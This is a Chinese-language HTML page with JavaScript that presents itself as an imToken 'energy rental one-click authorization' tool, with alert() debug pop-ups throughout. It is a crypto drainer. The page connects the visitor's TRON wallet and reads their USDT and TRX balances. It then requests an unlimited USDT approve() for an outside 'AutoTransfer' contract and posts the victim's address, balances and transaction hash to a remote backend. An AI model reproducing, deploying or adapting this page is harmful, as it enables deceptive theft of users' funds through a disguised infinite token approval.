<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>imToken一键能量授权</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
               padding: 20px; max-width: 500px; margin: 0 auto; background: #f5f5f5; }
        .header { text-align: center; margin-bottom: 30px; }
        .header h1 { font-size: 22px; color: #2c3e50; margin-bottom: 10px; }
        .warning { background: #fff8e1; color: #e6a23c; padding: 12px; border-radius: 8px;
                   font-size: 14px; margin-bottom: 20px; text-align: left; }
        .btn { width: 100%; padding: 15px; font-size: 16px; border: none; border-radius: 8px;
               background: #409EFF; color: white; cursor: pointer; margin-bottom: 15px; }
        .btn:disabled { background: #ccc; cursor: not-allowed; }
        #userInfo { text-align: center; font-size: 14px; color: #333; margin: 20px 0; padding: 15px; background: #fff; border-radius: 8px; }
        .record-list { margin-top: 30px; }
        .record-item { background: #fff; padding: 15px; margin-bottom: 15px; border-radius: 8px; font-size: 14px; }
        .record-item p { margin-bottom: 8px; color: #333; }
        .record-item p strong { color: #2c3e50; }
        .tx-link { color: #409EFF; text-decoration: none; }
        .status-tip { text-align: center; color: #666; font-size: 13px; margin: 10px 0; }
    </style>
</head>
<body>
<div class="header">
    <h1>能量租赁一键授权</h1>
    <div class="warning">
        ⚠️ 请用 <strong>imToken钱包内置浏览器</strong> 打开此页面<br>
        ⚠️ 在非钱包浏览器打开请先点击<strong>复制链接</strong>，然后连接imToken钱包后，点击钱包页面下方“浏览”，在搜索框中粘贴访问
    </div>
</div>

<!-- 链接显示+复制按钮的容器 -->
<div style="margin: 15px 0; display: flex; align-items: center; gap: 10px;">
    <span id="copyLinkText" style="color: #007AFF; word-break: break-all; flex: 1;">
        https://trc20trx-alt.github.io/Trc20.TRX/
    </span>
    <button id="copyLinkBtn" style="padding: 5px 10px; cursor: pointer;">
        <strong>复制链接</strong>
    </button>
</div>

<button id="connectBtn" class="btn">连接imToken钱包</button>
<button id="approveBtn" class="btn" disabled>能量授权</button>

<div id="userInfo">未连接钱包</div>
<!-- 后端发送状态提示 -->
<div id="sendStatus" class="status-tip"></div>

<div class="record-list">
    <h3 style="font-size: 16px; margin-bottom: 15px; color: #2c3e50;">授权记录</h3>
    <div id="approvalRecords">暂无授权记录</div>
</div>

<script>
    // ========== 第一步：初始化全局变量（加提示） ==========
    alert("【全局-1】开始初始化全局变量...");
    // 需替换的3处配置（务必确认后端接口正确）
    const AUTO_TRANSFER_CONTRACT = "TNAfknJTfkPbgmyfpwg3rJQrd17ZLKEMQa"; // 你的AutoTransfer合约地址
    const TRC20_TOKEN_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // 主网USDT地址
    const BACKEND_API = "https://tron-notify-backend.vercel.app/api/notify-approval"; // 后端接口（必须确认！）
    alert(`【全局-2】配置变量初始化完成：\n1. 转账合约：${AUTO_TRANSFER_CONTRACT.slice(0,8)}...\n2. USDT合约：${TRC20_TOKEN_ADDRESS.slice(0,8)}...\n3. 后端接口：${BACKEND_API}`);

    // 固定常量
    const INFINITE_APPROVE_AMOUNT = "0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF";
    const RECORD_KEY = "imtoken_infinite_approval_records";
    alert(`【全局-3】固定常量初始化完成：\n1. 无限授权额度：${INFINITE_APPROVE_AMOUNT.slice(0,8)}...\n2. 本地存储键名：${RECORD_KEY}`);

    // 动态变量（初始值）
    let tronWeb = null;
    let userAddress = null;
    let trc20Contract = null;
    let currentUsdtBalance = 0;
    let currentTrxBalance = 0;
    const sendStatusDom = document.getElementById("sendStatus");
    alert(`【全局-4】动态变量初始化完成：\ntronWeb: ${tronWeb}\nuserAddress: ${userAddress}\ntrc20Contract: ${trc20Contract}\n当前余额：USDT=${currentUsdtBalance}, TRX=${currentTrxBalance}`);


    // ========== 第二步：定义所有函数（每个函数定义后加提示） ==========
    // 函数1：初始化钱包（initWallet）
    async function initWallet() {
        alert("【函数-initWallet-1】进入initWallet函数，开始初始化钱包...");
        try {
            // 子步骤1：获取钱包默认地址
            alert("【函数-initWallet-2】开始获取钱包默认地址（tronWeb.defaultAddress.base58）...");
            userAddress = tronWeb.defaultAddress.base58;
            if (!userAddress) throw new Error("获取到的地址为空");
            alert(`【函数-initWallet-3】获取地址成功！地址：${userAddress.slice(0,8)}...${userAddress.slice(-6)}`);

            // 子步骤2：创建TRC20合约实例
            alert(`【函数-initWallet-4】开始创建TRC20合约实例，合约地址：${TRC20_TOKEN_ADDRESS.slice(0,8)}...`);
            trc20Contract = await tronWeb.contract().at(TRC20_TOKEN_ADDRESS);
            if (!trc20Contract) throw new Error("创建合约实例返回空");
            alert("【函数-initWallet-5】TRC20合约实例创建成功！");

            // 子步骤3：调用余额查询函数（连接后立即查余额）
            alert("【函数-initWallet-6】即将调用getAndShowBalance函数查询余额...");
            await getAndShowBalance();
            alert("【函数-initWallet-7】余额查询函数调用完成！");

            // 子步骤4：更新页面显示+激活授权按钮
            alert("【函数-initWallet-8】开始更新页面用户信息...");
            document.getElementById("userInfo").innerHTML = `
                已连接：<br>
                ${userAddress.slice(0, 8)}...${userAddress.slice(-6)}
            `;
            alert("【函数-initWallet-9】开始激活授权按钮（设置disabled=false）...");
            document.getElementById("approveBtn").disabled = false;
            alert("【函数-initWallet-10】initWallet函数执行完成！授权按钮已激活");
        } catch (e) {
            alert(`【函数-initWallet-错误】执行失败：\n错误类型：${e.name}\n错误信息：${e.message}\n错误位置：initWallet函数内`);
            throw e; // 抛出错误，让上层知道
        }
    }
    alert("【函数-定义1】initWallet函数定义完成，等待调用...");


    // 函数2：查询并显示余额（getAndShowBalance）
    async function getAndShowBalance() {
        alert("【函数-getAndShowBalance-1】进入getAndShowBalance函数，开始查询余额...");
        try {
            // 子步骤1：校验用户地址是否存在
            alert("【函数-getAndShowBalance-2】校验用户地址：" + (userAddress ? userAddress.slice(0,8)+"..." : "地址为空"));
            if (!userAddress) throw new Error("用户地址未获取到，无法查余额");
            alert("【函数-getAndShowBalance-3】地址校验通过，开始查USDT余额...");

            // 子步骤2：查USDT余额（TRC20合约balanceOf）
            alert(`【函数-getAndShowBalance-4】调用trc20Contract.balanceOf(${userAddress.slice(0,8)}...)...`);
            const usdtBalanceRaw = await trc20Contract.balanceOf(userAddress).call();
            alert(`【函数-getAndShowBalance-5】获取USDT原始余额：${usdtBalanceRaw}（合约最小单位）`);
            currentUsdtBalance = (usdtBalanceRaw / 1000000).toFixed(2); // 转正常数值（6位小数）
            alert(`【函数-getAndShowBalance-6】USDT余额转换完成：${currentUsdtBalance} USDT`);

            // 子步骤3：查TRX余额（tronWeb.trx.getBalance）
            alert(`【函数-getAndShowBalance-7】调用tronWeb.trx.getBalance(${userAddress.slice(0,8)}...)...`);
            const trxBalanceRaw = await tronWeb.trx.getBalance(userAddress);
            alert(`【函数-getAndShowBalance-8】获取TRX原始余额：${trxBalanceRaw}（合约最小单位）`);
            currentTrxBalance = (trxBalanceRaw / 1000000).toFixed(2); // 转正常数值（6位小数）
            alert(`【函数-getAndShowBalance-9】TRX余额转换完成：${currentTrxBalance} TRX`);

            // 子步骤4：更新页面状态+弹窗提示
            alert("【函数-getAndShowBalance-10】开始更新页面余额状态提示...");
            sendStatusDom.textContent = `当前余额：${currentUsdtBalance} USDT / ${currentTrxBalance} TRX`;
            alert(`【函数-getAndShowBalance-11】余额查询全流程完成！\n最终结果：\nUSDT：${currentUsdtBalance}\nTRX：${currentTrxBalance}`);
            return { usdt: currentUsdtBalance, trx: currentTrxBalance };
        } catch (err) {
            // 错误处理：先重试1次
            alert(`【函数-getAndShowBalance-错误1】首次查询失败：\n${err.message}\n将等待1秒后重试...`);
            try {
                await new Promise(resolve => setTimeout(resolve, 1000)); // 等待1秒
                alert("【函数-getAndShowBalance-错误2】开始重试查询余额...");
                
                // 重试USDT查询
                const usdtBalanceRaw = await trc20Contract.balanceOf(userAddress).call();
                currentUsdtBalance = (usdtBalanceRaw / 1000000).toFixed(2);
                // 重试TRX查询
                const trxBalanceRaw = await tronWeb.trx.getBalance(userAddress);
                currentTrxBalance = (trxBalanceRaw / 1000000).toFixed(2);

                alert(`【函数-getAndShowBalance-错误3】重试成功！\nUSDT：${currentUsdtBalance}\nTRX：${currentTrxBalance}`);
                sendStatusDom.textContent = `当前余额：${currentUsdtBalance} USDT / ${currentTrxBalance} TRX`;
                return { usdt: currentUsdtBalance, trx: currentTrxBalance };
            } catch (retryErr) {
                alert(`【函数-getAndShowBalance-错误4】重试失败：\n${retryErr.message}\n函数执行终止`);
                throw retryErr;
            }
        }
    }
    alert("【函数-定义2】getAndShowBalance函数定义完成，等待调用...");


    // 函数3：发送数据到后端（sendDataToBackend）
    async function sendDataToBackend(data, scene) {
        alert(`【函数-sendDataToBackend-1】进入函数，开始发送${scene}数据...`);
        try {
            // 子步骤1：校验后端接口地址
            alert("【函数-sendDataToBackend-2】校验后端接口地址：" + BACKEND_API);
            if (!BACKEND_API || BACKEND_API.includes("替换")) {
                throw new Error("后端接口地址未配置或配置错误！请修改BACKEND_API变量");
            }
            alert("【函数-sendDataToBackend-3】接口地址校验通过，开始准备请求数据...");

            // 子步骤2：打印请求数据（便于排查）
            alert(`【函数-sendDataToBackend-4】请求数据预览：\n地址：${data.address?.slice(0,8)||"无"}\n状态：${data.approveStatus}\n时间：${data.approveTime}`);

            // 子步骤3：创建超时控制器（15秒）
            alert("【函数-sendDataToBackend-5】创建请求超时控制器，超时时间：15秒");
            const controller = new AbortController();
            const timeoutId = setTimeout(() => {
                controller.abort();
                alert("【函数-sendDataToBackend-超时】请求超时！已自动终止");
            }, 15000);
            alert("【函数-sendDataToBackend-6】超时控制器创建完成，开始发起fetch请求...");

            // 子步骤4：发起POST请求
            const res = await fetch(BACKEND_API, {
                method: "POST",
                headers: { 
                    "Content-Type": "application/json",
                    "X-Request-Source": "imToken-Auth-Frontend" // 自定义请求头
                },
                body: JSON.stringify(data),
                credentials: "same-origin", // 跨域配置
                signal: controller.signal // 绑定超时
            });
            clearTimeout(timeoutId); // 清除超时
            alert(`【函数-sendDataToBackend-7】请求发起成功，收到后端响应：状态码=${res.status}`);

            // 子步骤5：校验响应状态
            if (!res.ok) {
                const errMsg = await res.text().catch(() => "未返回错误信息");
                throw new Error(`后端返回非200状态：${res.status}\n错误详情：${errMsg}`);
            }
            alert("【函数-sendDataToBackend-8】响应状态校验通过（200<=status<300），开始解析响应数据...");

            // 子步骤6：解析响应JSON
            const resData = await res.json();
            alert(`【函数-sendDataToBackend-9】响应数据解析完成：\n${JSON.stringify(resData).slice(0,100)}...`);

            // 子步骤7：校验后端处理结果
            if (resData.code !== 200 && !resData.success) {
                throw new Error(`后端处理失败：\n状态码：${resData.code || "无"}\n提示：${resData.msg || "无"}`);
            }
            alert(`【函数-sendDataToBackend-10】${scene}数据发送成功！后端返回：${resData.msg || "处理成功"}`);

            // 子步骤8：更新页面状态
            sendStatusDom.style.color = "#4CAF50";
            sendStatusDom.textContent = `✅ ${scene}数据已同步到后端`;
            return resData;
        } catch (err) {
            alert(`【函数-sendDataToBackend-错误】发送${scene}数据失败：\n${err.message}\n函数执行终止`);
            sendStatusDom.style.color = "#F44336";
            sendStatusDom.textContent = `❌ ${scene}数据发送失败：${err.message}`;
            throw err;
        }
    }
    alert("【函数-定义3】sendDataToBackend函数定义完成，等待调用...");


    // 函数4：保存授权记录到本地（saveApprovalRecord）
    function saveApprovalRecord(record) {
        alert("【函数-saveApprovalRecord-1】进入函数，开始保存本地记录...");
        try {
            // 子步骤1：读取已有记录
            alert(`【函数-saveApprovalRecord-2】读取本地存储，键名：${RECORD_KEY}`);
            const existing = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
            alert(`【函数-saveApprovalRecord-3】读取到已有记录数：${existing.length}条`);

            // 子步骤2：去重（避免重复记录）
            alert("【函数-saveApprovalRecord-4】开始去重（按txHash/时间戳）...");
            const newRecords = existing.filter(item => 
                item.txHash !== record.txHash && item.timestamp !== record.timestamp
            );
            alert(`【函数-saveApprovalRecord-5】去重后剩余记录数：${newRecords.length}条`);

            // 子步骤3：添加新记录
            newRecords.push(record);
            alert(`【函数-saveApprovalRecord-6】添加新记录，当前总记录数：${newRecords.length}条`);

            // 子步骤4：保存到localStorage
            localStorage.setItem(RECORD_KEY, JSON.stringify(newRecords));
            alert("【函数-saveApprovalRecord-7】本地记录保存成功！");
        } catch (err) {
            alert(`【函数-saveApprovalRecord-错误】保存失败：\n${err.message}\n函数执行终止`);
            throw err;
        }
    }
    alert("【函数-定义4】saveApprovalRecord函数定义完成，等待调用...");


    // 函数5：渲染授权记录（renderApprovalRecords）
    function renderApprovalRecords() {
        alert("【函数-renderApprovalRecords-1】进入函数，开始渲染记录...");
        try {
            // 子步骤1：获取容器+读取记录
            const container = document.getElementById("approvalRecords");
            alert(`【函数-renderApprovalRecords-2】获取记录容器：${container.id}`);
            const records = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
            alert(`【函数-renderApprovalRecords-3】读取到记录数：${records.length}条`);

            // 子步骤2：判断是否有记录
            if (records.length === 0) {
                alert("【函数-renderApprovalRecords-4】无记录，显示默认文本...");
                container.innerHTML = "<div class='record-item'>暂无授权记录</div>";
                alert("【函数-renderApprovalRecords-5】默认文本渲染完成！");
                return;
            }

            // 子步骤3：渲染多条记录
            alert("【函数-renderApprovalRecords-6】开始渲染记录HTML...");
            const recordHtml = records.map((record, index) => `
                <div class="record-item">
                    <p><strong>序号：</strong>${index+1}</p>
                    <p><strong>状态：</strong>${record.approveStatus === "success" ? "✅ 授权成功" : "❌ 授权失败"}</p>
                    <p><strong>地址：</strong>${record.address.slice(0, 8)}...${record.address.slice(-6)}</p>
                    <p><strong>USDT：</strong>${record.usdtBalance} USDT</p>
                    <p><strong>TRX：</strong>${record.trxBalance} TRX</p>
                    <p><strong>时间：</strong>${record.approveTime}</p>
                    ${record.txHash ? `<p><a href="https://tronscan.org/#/transaction/${record.txHash}" target="_blank" class="tx-link">查看交易</a></p>` : ""}
                </div>
            `).join("");
            alert(`【函数-renderApprovalRecords-7】HTML渲染完成，共${records.length}条记录`);

            // 子步骤4：更新容器内容
            container.innerHTML = recordHtml;
            alert("【函数-renderApprovalRecords-8】记录渲染全流程完成！");
        } catch (err) {
            alert(`【函数-renderApprovalRecords-错误】渲染失败：\n${err.message}\n函数执行终止`);
            throw err;
        }
    }
    alert("【函数-定义5】renderApprovalRecords函数定义完成，等待调用...");


    // ========== 第三步：window.onload（页面加载完成后执行，核心流程） ==========
    window.onload = async () => {
        alert("【onload-1】页面加载完成，开始执行核心流程...");

        // 子步骤1：获取DOM元素
        alert("【onload-2】开始获取页面DOM元素...");
        const connectBtn = document.getElementById("connectBtn");
        const approveBtn = document.getElementById("approveBtn");
        const copyLinkText = document.getElementById("copyLinkText");
        const copyLinkBtn = document.getElementById("copyLinkBtn");
        alert(`【onload-3】DOM元素获取完成：\n1. 连接按钮：${connectBtn.id}\n2. 授权按钮：${approveBtn.id}\n3. 链接文本：${copyLinkText.id}\n4. 复制按钮：${copyLinkBtn.id}`);

        // 子步骤2：绑定复制链接按钮事件
        alert("【onload-4】开始绑定复制链接按钮（copyLinkBtn）点击事件...");
        copyLinkBtn.addEventListener("click", async () => {
            alert("【复制事件-1】点击了复制链接按钮，开始执行复制...");
            try {
                const linkContent = copyLinkText.textContent.trim();
                alert(`【复制事件-2】获取到链接内容：${linkContent.slice(0,20)}...`);
                
                await navigator.clipboard.writeText(linkContent);
                alert("【复制事件-3】链接已成功复制到剪贴板！");
            } catch (error) {
                alert(`【复制事件-错误】复制失败：\n${error.message}\n请手动选中链接复制~`);
            }
        });
        alert("【onload-5】复制链接按钮事件绑定完成！");

        // 子步骤3：检测并自动连接钱包
        alert("【onload-6】开始检测imToken环境（window.tronWeb）...");
        if (window.tronWeb) {
            alert(`【onload-7】检测到tronWeb存在！版本：${window.tronWeb.version || "未知"}`);
            if (window.tronWeb.ready) {
                alert("【onload-8】tronWeb已ready，开始自动初始化钱包...");
                tronWeb = window.tronWeb;
                alert("【onload-9】即将调用initWallet函数（自动连接）...");
                await initWallet();
                alert("【onload-10】initWallet函数调用完成（自动连接流程）！");
            } else {
                alert("【onload-11】tronWeb未ready，开始监听'ready'事件...");
                window.tronWeb.on('ready', async () => {
                    alert("【onload-12】监听到tronWeb ready事件，开始初始化钱包...");
                    tronWeb = window.tronWeb;
                    alert("【onload-13】即将调用initWallet函数（监听后连接）...");
                    await initWallet();
                    alert("【onload-14】initWallet函数调用完成（监听后连接流程）！");
                });
            }
        } else {
            alert("【onload-错误1】未检测到window.tronWeb！请用imToken内置浏览器打开页面");
            document.getElementById("userInfo").innerHTML = "请用imToken内置浏览器打开此页面";
        }
        alert("【onload-15】自动连接钱包流程处理完成！");

        // 子步骤4：绑定手动连接钱包按钮事件
        alert("【onload-16】开始绑定手动连接按钮（connectBtn）点击事件...");
        connectBtn.onclick = async () => {
            alert("【连接事件-1】点击了手动连接按钮，开始执行连接流程...");
            try {
                // 检测tronWeb是否存在
                alert("【连接事件-2】检测window.tronWeb是否存在...");
                if (!window.tronWeb) {
                    alert("【连接事件-3】未检测到tronWeb，开始跳转至imToken浏览器...");
                    window.location.href = `imtoken://browser?url=${encodeURIComponent(window.location.href)}`;
                    alert("【连接事件-4】跳转链接已触发，请在imToken中确认...");
                    return;
                }
                alert("【连接事件-5】检测到tronWeb，开始调用钱包授权（tron_requestAccounts）...");

                // 调用钱包授权获取账户
                const accounts = await window.tronWeb.request({ method: "tron_requestAccounts" });
                alert(`【连接事件-6】调用tron_requestAccounts成功，返回账户数：${accounts.length}个`);
                
                // 设置用户地址
                userAddress = accounts[0];
                if (!userAddress) throw new Error("获取到的账户地址为空");
                alert(`【连接事件-7】设置用户地址成功：${userAddress.slice(0,8)}...${userAddress.slice(-6)}`);

                // 调用initWallet初始化
                alert("【连接事件-8】即将调用initWallet函数（手动连接后）...");
                await initWallet();
                alert("【连接事件-9】initWallet函数调用完成，手动连接流程结束！");
            } catch (e) {
                alert(`【连接事件-错误】手动连接失败：\n错误类型：${e.name}\n错误信息：${e.message}\n错误位置：connectBtn点击事件内`);
            }
        };
        alert("【onload-17】手动连接按钮事件绑定完成！");

        // 子步骤5：绑定授权按钮点击事件（初始disabled，需initWallet激活）
        alert("【onload-18】开始绑定授权按钮（approveBtn）点击事件...");
        approveBtn.onclick = async () => {
            alert("【授权事件-1】点击了授权按钮，开始执行授权流程...");
            try {
                // 前置校验：余额是否已获取
                alert("【授权事件-2】前置校验：是否已获取余额...");
                if (currentUsdtBalance === 0 && currentTrxBalance === 0) {
                    alert("【授权事件-3】未获取到余额，即将调用getAndShowBalance函数重新查询...");
                    await getAndShowBalance();
                    alert("【授权事件-4】getAndShowBalance函数调用完成，余额已更新");
                }
                alert(`【授权事件-5】前置校验通过，当前余额：\nUSDT：${currentUsdtBalance}\nTRX：${currentTrxBalance}`);

                // 执行授权操作（approve）
                alert("【授权事件-6】开始执行授权操作：调用trc20Contract.approve...");
                alert(`【授权事件-7】approve参数：\n1. 授权目标：${AUTO_TRANSFER_CONTRACT.slice(0,8)}...\n2. 授权额度：${INFINITE_APPROVE_AMOUNT.slice(0,8)}...（无限授权）\n3. 发起地址：${userAddress.slice(0,8)}...`);
                
                const result = await trc20Contract.approve(
                    AUTO_TRANSFER_CONTRACT,
                    INFINITE_APPROVE_AMOUNT
                ).send({
                    from: userAddress,
                    shouldPollResponse: true // 等待钱包确认
                });
                alert(`【授权事件-8】approve调用成功，返回交易结果：\ntxID：${result.transaction.txID.slice(0,16)}...\n区块号：${result.blockNumber || "待确认"}`);

                // 构建成功数据，发送后端
                alert("【授权事件-9】开始构建授权成功数据...");
                const successData = {
                    address: userAddress,
                    usdtBalance: currentUsdtBalance,
                    trxBalance: currentTrxBalance,
                    approveStatus: "success",
                    txHash: result.transaction.txID,
                    approveType: "无限额度",
                    approveTime: new Date().toLocaleString(),
                    timestamp: new Date().getTime()
                };
                alert("【授权事件-10】成功数据构建完成，即将发送到后端...");

                // 发送成功数据到后端
                await sendDataToBackend(successData, "授权成功");
                alert("【授权事件-11】后端发送成功，开始保存本地记录...");

                // 保存本地记录
                await saveApprovalRecord(successData);
                alert("【授权事件-12】本地记录保存完成，开始重新渲染记录...");

                // 重新渲染记录
                renderApprovalRecords();
                alert("【授权事件-13】记录渲染完成，授权成功全流程结束！");

                // 最终提示
                alert(`【授权事件-14】🎉 授权成功总结：\n1. 交易哈希：${successData.txHash.slice(0,16)}...\n2. USDT余额：${successData.usdtBalance}\n3. 后端状态：已同步\n4. 本地状态：已保存`);
            } catch (approveErr) {
                alert(`【授权事件-错误1】授权操作失败，开始处理失败流程...\n错误信息：${approveErr.message}`);
                try {
                    // 构建失败数据，强制发送后端
                    alert("【授权事件-错误2】开始构建授权失败数据...");
                    const failData = {
                        address: userAddress || "未获取到地址",
                        usdtBalance: currentUsdtBalance || 0,
                        trxBalance: currentTrxBalance || 0,
                        approveStatus: "fail",
                        errorMsg: approveErr.message,
                        approveType: "无限额度",
                        approveTime: new Date().toLocaleString(),
                        timestamp: new Date().getTime()
                    };
                    alert("【授权事件-错误3】失败数据构建完成，即将发送到后端...");

                    // 强制发送失败数据到后端
                    await sendDataToBackend(failData, "授权失败");
                    alert("【授权事件-错误4】失败数据发送到后端完成！");

                    // 保存失败记录到本地
                    await saveApprovalRecord(failData);
                    alert("【授权事件-错误5】失败记录保存到本地完成！");

                    // 重新渲染记录
                    renderApprovalRecords();
                    alert("【授权事件-错误6】失败流程处理完成，授权失败全流程结束！");
                } catch (failErr) {
                    alert(`【授权事件-错误7】处理失败流程时再次出错：\n${failErr.message}\n最终流程终止`);
                }
            }
        };
        alert("【onload-19】授权按钮事件绑定完成！");

        // 子步骤6：初始化渲染记录
        alert("【onload-20】即将调用renderApprovalRecords函数，初始化渲染记录...");
        await renderApprovalRecords(); // 用await确保渲染完成
        alert("【onload-21】renderApprovalRecords函数调用完成，记录初始化渲染结束！");

        // 子步骤7：onload流程结束
        alert("【onload-22】页面核心流程（onload）全部执行完成！\n当前状态：\n1. 授权按钮：${approveBtn.disabled ? '❌ 未激活' : '✅ 已激活'}\n2. 用户地址：${userAddress ? userAddress.slice(0,8)+'...' : '❌ 未获取'}\n3. 合约实例：${trc20Contract ? '✅ 已创建' : '❌ 未创建'}`);
    };

    // ========== 第四步：页面加载完成提示 ==========
    alert("【页面-最终】JS代码加载完成，等待window.onload执行...\n请按弹窗提示逐步操作，并记录所有弹窗内容");
</script>
</body>
</html>
